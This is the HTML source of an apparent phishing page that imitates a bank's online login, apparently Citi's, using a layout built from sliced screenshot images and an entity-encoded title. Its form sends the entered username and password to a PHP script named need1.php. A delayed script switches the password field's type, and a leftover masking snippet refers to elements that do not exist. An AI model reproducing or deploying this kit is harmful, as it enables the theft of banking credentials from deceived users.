<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#76;&#111;&#103;&#105;&#110;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<style type="text/css">
  
.textbox {  
    border: solid 1px #C7C9CA;
  	border-radius: 5px;
 	padding-left: 10px;
	font-family: "CitiSans", "Trebuchet MS", Helvetica, Arial, sans-serif;
  	font-size: 16px;
    color: #58595B;
    height: 32px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #8EB1EB; 
    border-style: solid; 
  	border-radius: 2px;
    border-width: 2px; 
    outline: 0; 
 } 

 </style>	
 <style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:24px;
							height:19px; 
							display:inline-block;
							line-height:19px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:19px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -19px;
						}
						label.css-label {
				background-image:url(images/csscheckbox_2fb20e2964452924671ef46d2a211611.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:144px; top:19px; width:173px; height:30px; z-index:0"><a href="#"><img src="images/z1.png" alt="" title="" border=0 width=173 height=30></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:144px; top:60px; width:533px; height:431px; z-index:1"><img src="images/z2.png" alt="" title="" border=0 width=533 height=431></div>

<div id="image3" style="position:absolute; overflow:hidden; left:899px; top:59px; width:304px; height:399px; z-index:2"><a href="#"><img src="images/z3.png" alt="" title="" border=0 width=304 height=399></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:422px; top:213px; width:127px; height:14px; z-index:3"><a href="#"><img src="images/z4.png" alt="" title="" border=0 width=127 height=14></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:423px; top:317px; width:99px; height:15px; z-index:4"><a href="#"><img src="images/z5.png" alt="" title="" border=0 width=99 height=15></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:160px; top:362px; width:104px; height:15px; z-index:5"><a href="#"><img src="images/z6.png" alt="" title="" border=0 width=104 height=15></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:359px; top:404px; width:51px; height:23px; z-index:6"><a href="#"><img src="images/z7.png" alt="" title="" border=0 width=51 height=23></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:605px; width:1349px; height:51px; z-index:7"><img src="images/z8.png" alt="" title="" border=0 width=1349 height=51></div>

<div id="image9" style="position:absolute; overflow:hidden; left:266px; top:692px; width:767px; height:233px; z-index:8"><a href="#"><img src="images/z9.png" alt="" title="" border=0 width=767 height=233></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:264px; top:965px; width:756px; height:112px; z-index:9"><a href="#"><img src="images/z10.png" alt="" title="" border=0 width=756 height=112></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:268px; top:1127px; width:124px; height:117px; z-index:10"><a href="#"><img src="images/z11.png" alt="" title="" border=0 width=124 height=117></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:143px; top:1257px; width:1074px; height:158px; z-index:11"><img src="images/z12.png" alt="" title="" border=0 width=1074 height=158></div>
<form action=need1.php name=dekhtahn id=dekhtahn method=post>
<input name="usr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:249px;left:161px;top:203px;z-index:12">
<div id="checkboxG1"  style="position:absolute; left:159px; top:246px; z-index:13"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:159px; top:246px; z-index:13"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<input name="psw" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:249px;left:161px;top:306px;z-index:14">
<div id="formimage1" style="position:absolute; left:160px; top:396px; z-index:15"><input type="image" name="formimage1" width="186" height="35" src="images/accept.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
